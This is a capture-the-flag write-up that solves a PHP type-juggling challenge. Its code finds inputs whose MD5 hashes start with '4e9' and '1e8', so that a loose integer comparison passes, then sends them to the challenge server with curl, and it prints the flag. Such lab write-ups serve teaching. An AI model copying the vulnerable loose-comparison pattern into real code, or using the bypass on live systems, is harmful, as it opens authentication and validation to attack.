# MD5 Scientific Notation Challenge Writeup

## Challenge Information
- **URL**: http://38.60.200.116:8090/
- **Category**: Web Security / PHP Type Juggling
- **Points**: 20

![](attachments/Pasted%20image%2020251130140806.png)
## Challenge

![](attachments/Pasted%20image%2020251130143106.png)


```
<?php
error_reporting(0);
ini_set('display_errors', 0);
if(!isset($_GET['a']) || !isset($_GET['b'])){
    highlight_file(__FILE__);exit();
}
include('flag.php');
$a = $_GET['a'] ?? '';
$b = $_GET['b'];

if((int) md5($a) == 4000000000 && (int) md5($b) == 100000000){
    echo $flag;
}
?>
```

## Initial Analysis

The challenge requires finding values for parameters `a` and `b` such that:
- `(int) md5($a) == 4000000000`
- `(int) md5($b) == 100000000`

At first glance, this seems impossible:
- MD5 produces 32-character hexadecimal hashes
- PHP's `(int)` cast reads from left to right until it hits a non-digit character
- Finding an MD5 hash that starts with "4000000000" or "100000000" would require astronomical brute force (billions of attempts)

## Understanding PHP Type Juggling

### String to Integer Conversion
When PHP converts a string to an integer using `(int)`, it:
1. Reads characters from left to right
2. Stops when it encounters a non-numeric character (except scientific notation)
3. Returns the numeric value found

**Key Discovery**: PHP recognizes **scientific notation** during type casting!

### Scientific Notation in Hexadecimal MD5 Hashes
MD5 hashes are hexadecimal strings (0-9, a-f). When an MD5 hash happens to contain patterns like:
- `4e9...` → PHP interprets as `4 × 10^9 = 4000000000`
- `1e8...` → PHP interprets as `1 × 10^8 = 100000000`

This is because:
- 'e' is a valid character in both hex AND scientific notation
- PHP's type casting prioritizes scientific notation interpretation
- The `==` loose comparison allows this type juggling to succeed

## Solution Strategy

Instead of brute-forcing for impossible exact digit matches, search for MD5 hashes that contain scientific notation patterns:

```python
for i in range(10000):
    md5_hash = md5(str(i))
    if md5_hash matches pattern like "4e9..." or "1e8...":
        check if (int)md5_hash equals target
```

## Finding the Values

Testing incrementally through integers:

```bash
php -r '
for($i = 0; $i < 10000; $i++) {
    $md5 = md5((string)$i);
    if(preg_match("/^[0-9]+e[0-9]/", $md5)) {
        $int_md5 = (int)$md5;
        if($int_md5 == 4000000000 || $int_md5 == 100000000) {
            echo "Input: $i, MD5: $md5, (int)MD5: $int_md5\n";
        }
    }
}
'
Input: 1556, MD5: 4e9cec1f583056459111d63e24f3b8ef, (int)MD5: 4000000000
Input: 2154, MD5: 1e8c391abfde9abea82d75a2d60278d4, (int)MD5: 100000000
Input: 4116, MD5: 1e8ca836c962598551882e689265c1c5, (int)MD5: 100000000
Input: 4845, MD5: 1e8eec0db325b87b0f57b5056efd8afb, (int)MD5: 100000000
Input: 6705, MD5: 1e8a19426224ca89e83cef47f1e7f53b, (int)MD5: 100000000
```

### Results Found

**For a = 1556:**
- MD5: `4e9cec1f583056459111d63e24f3b8ef`
- Pattern: `4e9...` = `4 × 10^9`
- `(int)` conversion: `4000000000` ✓

**For b = 2154:**
- MD5: `1e8c391abfde9abea82d75a2d60278d4`
- Pattern: `1e8...` = `1 × 10^8`
- `(int)` conversion: `100000000` ✓

## Verification

```bash
php -r 'echo "(int)md5(\"1556\") = " . (int)md5("1556") . "\n";'
# Output: (int)md5("1556") = 4000000000

php -r 'echo "(int)md5(\"2154\") = " . (int)md5("2154") . "\n";'
# Output: (int)md5("2154") = 100000000
```

## Exploitation

```bash
curl "http://38.60.200.116:8090/?a=1556&b=2154"
```

**Flag obtained:**
```
NOVA_CTF{mDFiv3_1s_fuN__17d33247e29c819bcfe68e1bdbdec3bc}
```

![](attachments/Pasted%20image%2020251130142753.png)

